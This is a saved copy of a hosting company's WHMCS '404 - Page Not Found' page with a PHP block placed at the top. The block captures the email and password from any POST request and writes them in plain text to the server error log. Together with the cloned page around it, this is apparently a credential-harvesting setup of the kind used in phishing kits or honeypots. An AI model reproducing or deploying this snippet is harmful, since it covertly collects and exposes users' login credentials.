<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'unknown';
    $password = $_POST['password'] ?? 'unknown';

    // Log credentials to the error log
    error_log("LOGIN ATTEMPT: Email: $email | Password: $password");
}
?>

<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>404 - Page Not Found - bitconnect.hosting</title>
    <!-- Styling -->
<link href="404%20-%20Page%20Not%20Found%20-%20bitconnect.hosting_files/open-sans-family.css" rel="stylesheet" type="text/css">
<link href="404%20-%20Page%20Not%20Found%20-%20bitconnect.hosting_files/all.min.css" rel="stylesheet">
<link href="404%20-%20Page%20Not%20Found%20-%20bitconnect.hosting_files/theme.min.css" rel="stylesheet">
<link href="404%20-%20Page%20Not%20Found%20-%20bitconnect.hosting_files/fontawesome-all.min.css" rel="stylesheet">
<link href="404%20-%20Page%20Not%20Found%20-%20bitconnect.hosting_files/custom.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">


<script>
    var csrfToken = 'fd72c700691662bb0a2c51060ba8a5eabdabef05',
        markdownGuide = 'Markdown Guide',
        locale = 'en',
        saved = 'saved',
        saving = 'autosaving',
        whmcsBaseUrl = "";
    </script>
<script src="404%20-%20Page%20Not%20Found%20-%20bitconnect.hosting_files/scripts.min.js"></script>

    
</head>
<body class="primary-bg-color" data-phone-cc-input="1">
        

    <header id="header" class="header">
        
        <div class="navbar navbar-light">
            <div class="container">
                <a class="navbar-brand mr-3" href="https://bitconnect.hosting/index.php">
                                            <img src="404%20-%20Page%20Not%20Found%20-%20bitconnect.hosting_files/logo.png" alt="bitconnect.hosting" class="logo-img">
                                    </a>

                <form method="post" action="/knowledgebase/search" class="form-inline ml-auto">
<input type="hidden" name="token" value="fd72c700691662bb0a2c51060ba8a5eabdabef05">
                    <div class="input-group search d-none d-xl-flex">
                        <div class="input-group-prepend">
                            <button class="btn btn-default" type="submit">
                                <i class="fas fa-search"></i>
                            </button>
                        </div>
                        <input class="form-control appended-form-control font-weight-light" type="text" name="search" placeholder="Search our knowledgebase...">
                    </div>
                </form>

                <ul class="navbar-nav toolbar">
                    <li class="nav-item ml-3">
                        <a class="btn nav-link cart-btn" href="https://bitconnect.hosting/cart.php?a=view">
                            <i class="far fa-shopping-cart fa-fw"></i>
                            <span id="cartItemCount" class="badge badge-info">0</span>
                            <span class="sr-only">Shopping Cart</span>
                        </a>
                    </li>
                    <li class="nav-item ml-3 d-xl-none">
                        <button class="btn nav-link" type="button" data-toggle="collapse" data-target="#mainNavbar">
                            <span class="fas fa-bars fa-fw"></span>
                        </button>
                    </li>
                </ul>
            </div>
        </div>
        <div class="navbar navbar-expand-xl main-navbar-wrapper">
            <div class="container">
                <div class="collapse navbar-collapse" id="mainNavbar">
                    <form method="post" action="/knowledgebase/search" class="d-xl-none">
<input type="hidden" name="token" value="fd72c700691662bb0a2c51060ba8a5eabdabef05">
                        <div class="input-group search w-100 mb-2">
                            <div class="input-group-prepend">
                                <button class="btn btn-default" type="submit">
                                    <i class="fas fa-search"></i>
                                </button>
                            </div>
                            <input class="form-control prepended-form-control" type="text" name="search" placeholder="Search our knowledgebase...">
                        </div>
                    </form>
                    <ul id="nav" class="navbar-nav mr-auto">
                            <li menuitemname="Home" class="d-block no-collapse" id="Primary_Navbar-Home">
        <a class="pr-4" href="https://bitconnect.hosting/index.php">
                        Home
                    </a>
            </li>
    <li menuitemname="Store" class="d-block dropdown no-collapse" id="Primary_Navbar-Store">
        <a class="pr-4 dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" href="#">
                        Store
                    </a>
                    <ul class="dropdown-menu">
                                                <li menuitemname="Browse Products Services" class="dropdown-item" id="Primary_Navbar-Store-Browse_Products_Services">
                        <a href="https://bitconnect.hosting/store" class="dropdown-item px-2 py-0">
                                                        Browse All
                                                    </a>
                    </li>
                                                                <div class="dropdown-divider"></div>
                                                                <li menuitemname="Webhosting" class="dropdown-item" id="Primary_Navbar-Store-Webhosting">
                        <a href="https://bitconnect.hosting/store/webhosting" class="dropdown-item px-2 py-0">
                                                        Webhosting
                                                    </a>
                    </li>
                                        </ul>
            </li>
    <li menuitemname="Announcements" class="d-block" id="Primary_Navbar-Announcements">
        <a class="pr-4" href="https://bitconnect.hosting/announcements">
                        Announcements
                    </a>
            </li>
    <li menuitemname="Knowledgebase" class="d-block" id="Primary_Navbar-Knowledgebase">
        <a class="pr-4" href="https://bitconnect.hosting/knowledgebase">
                        Knowledgebase
                    </a>
            </li>
    <li menuitemname="Network Status" class="d-block" id="Primary_Navbar-Network_Status">
        <a class="pr-4" href="https://bitconnect.hosting/serverstatus.php">
                        Network Status
                    </a>
            </li>
    <li menuitemname="Contact Us" class="d-block" id="Primary_Navbar-Contact_Us">
        <a class="pr-4" href="https://bitconnect.hosting/contact.php">
                        Contact Us
                    </a>
            </li>
    <li class="d-none dropdown collapsable-dropdown">
        <a class="dropdown-toggle" href="#" id="navbarDropdownMenu" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            More
        </a>
        <ul class="collapsable-dropdown-menu dropdown-menu" aria-labelledby="navbarDropdownMenu">
        </ul>
    </li>
                    </ul>
                    <ul class="navbar-nav ml-auto">
                            <li menuitemname="Account" class="d-block no-collapse dropdown no-collapse" id="Secondary_Navbar-Account">
        <a class=" dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" href="#">
                        Account
                    </a>
                    <ul class="dropdown-menu dropdown-menu-right">
                                                <li menuitemname="Login" class="dropdown-item" id="Secondary_Navbar-Account-Login">
                        <a href="https://bitconnect.hosting/clientarea.php" class="dropdown-item px-2 py-0">
                                                        Login
                                                    </a>
                    </li>
                                                                <div class="dropdown-divider"></div>
                                                                <li menuitemname="Forgot Password?" class="dropdown-item" id="Secondary_Navbar-Account-Forgot_Password?">
                        <a href="https://bitconnect.hosting/password/reset" class="dropdown-item px-2 py-0">
                                                        Forgot Password?
                                                    </a>
                    </li>
                                        </ul>
            </li>
                    </ul>
                </div>
            </div>
        </div>
    </header>

    
    <nav class="master-breadcrumb" aria-label="breadcrumb">
        <div class="container">
            <ol class="breadcrumb">
    </ol>
        </div>
    </nav>

        
    
    <section id="main-body">
        <div class="">
            <div class="row">

                        <div class="col-12 primary-content">


<div class="container">
    <div class="text-center p-5">

        <i class="fas fa-exclamation-circle display-1 font-weight-bold text-primary"></i>
        <h1 class="display-1 font-weight-bold text-primary line-height-reduced mb-5">
            Oops!
        </h1>
        <h3>We couldn't find that page</h3>
        <p>Please try navigating using the options below.</p>

        <div class="buttons">
            <a href="https://bitconnect.hosting/" class="btn btn-primary px-4">
                Homepage
            </a>
            <a href="https://bitconnect.hosting/contact.php" class="btn btn-info px-4">
                Contact Support
            </a>
        </div>

    </div>
</div>


                    </div>

                    </div>
                                    <div class="clearfix"></div>
            </div>
        
    </section>

    <footer id="footer" class="footer">
        <div class="container">
            <ul class="list-inline mb-7 text-center float-lg-right">
                
                                    <li class="list-inline-item">
                        <button type="button" class="btn" data-toggle="modal" data-target="#modalChooseLanguage">
                            <div class="d-inline-block align-middle">
                                <div class="iti-flag gb"></div>
                            </div>
                            English
                            /
                            €
                            EUR
                        </button>
                    </li>
                            </ul>

            <ul class="nav justify-content-center justify-content-lg-start mb-7">
                <li class="nav-item">
                    <a class="nav-link" href="https://bitconnect.hosting/contact.php">
                        Contact Us
                    </a>
                </li>
                            </ul>

            <p class="copyright mb-0">
                Copyright © 2025 bitconnect.hosting. All Rights Reserved.
            </p>
        </div>
    </footer>

    <div id="fullpage-overlay" class="w-hidden" style="display: none;">
        <div class="outer-wrapper">
            <div class="inner-wrapper">
                <img src="404%20-%20Page%20Not%20Found%20-%20bitconnect.hosting_files/overlay-spinner.svg" alt="">
                <br>
                <span class="msg"></span>
            </div>
        </div>
    </div>

    <div class="modal system-modal fade" id="modalAjax" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"></h5>
                    <button type="button" class="close" data-dismiss="modal">
                        <span aria-hidden="true">×</span>
                        <span class="sr-only">Close</span>
                    </button>
                </div>
                <div class="modal-body">
                    Loading...
                </div>
                <div class="modal-footer">
                    <div class="float-left loader">
                        <i class="fas fa-circle-notch fa-spin"></i>
                        Loading...
                    </div>
                    <button type="button" class="btn btn-default" data-dismiss="modal">
                        Close
                    </button>
                    <button type="button" class="btn btn-primary modal-submit">
                        Submit
                    </button>
                </div>
            </div>
        </div>
    </div>

    <form method="get" action="/login/lll?">
        <div class="modal modal-localisation" id="modalChooseLanguage" tabindex="-1" role="dialog">
            <div class="modal-dialog modal-lg" role="document">
                <div class="modal-content">
                    <div class="modal-body">
                        <button type="button" class="close text-light" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">×</span>
                        </button>

                                                    <h5 class="h5 pt-5 pb-3">Choose language</h5>
                            <div class="row item-selector">
                                <input type="hidden" name="language" data-current="english" value="english">
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="arabic">
                                            العربية
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="azerbaijani">
                                            Azerbaijani
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="catalan">
                                            Català
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="chinese">
                                            中文
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="croatian">
                                            Hrvatski
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="czech">
                                            Čeština
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="danish">
                                            Dansk
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="dutch">
                                            Nederlands
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item active" data-value="english">
                                            English
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="estonian">
                                            Estonian
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="farsi">
                                            Persian
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="french">
                                            Français
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="german">
                                            Deutsch
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="hebrew">
                                            עברית
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="hungarian">
                                            Magyar
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="italian">
                                            Italiano
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="macedonian">
                                            Macedonian
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="norwegian">
                                            Norwegian
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="portuguese-br">
                                            Português
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="portuguese-pt">
                                            Português
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="romanian">
                                            Română
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="russian">
                                            Русский
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="spanish">
                                            Español
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="swedish">
                                            Svenska
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="turkish">
                                            Türkçe
                                        </a>
                                    </div>
                                                                    <div class="col-4">
                                        <a href="#" class="item" data-value="ukranian">
                                            Українська
                                        </a>
                                    </div>
                                                            </div>
                                                                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-default">Apply</button>
                    </div>
                </div>
            </div>
        </div>
    </form>

    
    <form action="#" id="frmGeneratePassword">
    <div class="modal fade" id="modalGeneratePassword">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header bg-primary text-white">
                    <h4 class="modal-title">
                        Generate Password
                    </h4>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="alert alert-danger w-hidden" id="generatePwLengthError">
                        Please enter a number between 8 and 64 for the password length
                    </div>
                    <div class="form-group row">
                        <label for="generatePwLength" class="col-sm-4 col-form-label">Password Length</label>
                        <div class="col-sm-8">
                            <input type="number" min="8" max="64" value="12" step="1" class="form-control input-inline input-inline-100" id="inputGeneratePasswordLength">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label for="generatePwOutput" class="col-sm-4 col-form-label">Generated Password</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="inputGeneratePasswordOutput">
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-sm-8 offset-sm-4">
                            <button type="submit" class="btn btn-default btn-sm">
                                <i class="fas fa-plus fa-fw"></i>
                                Generate new password
                            </button>
                            <button type="button" class="btn btn-default btn-sm copy-to-clipboard" data-clipboard-target="#inputGeneratePasswordOutput">
                                <img src="404%20-%20Page%20Not%20Found%20-%20bitconnect.hosting_files/clippy.svg" alt="Copy to clipboard" width="15">
                                Copy
                            </button>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default" data-dismiss="modal">
                        Close
                    </button>
                    <button type="button" class="btn btn-primary" id="btnGeneratePasswordInsert" data-clipboard-target="#inputGeneratePasswordOutput">
                        Copy to clipboard and Insert
                    </button>
                </div>
            </div>
        </div>
    </div>
</form>

    



<div id="lightboxOverlay" class="lightboxOverlay" style="display: none;"></div><div id="lightbox" class="lightbox" style="display: none;"><div class="lb-outerContainer"><div class="lb-container"><img class="lb-image" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="><div class="lb-nav"><a class="lb-prev" href=""></a><a class="lb-next" href=""></a></div><div class="lb-loader"><a class="lb-cancel"></a></div></div></div><div class="lb-dataContainer"><div class="lb-data"><div class="lb-details"><span class="lb-caption"></span><span class="lb-number"></span></div><div class="lb-closeContainer"><a class="lb-close"></a></div></div></div></div></body></html>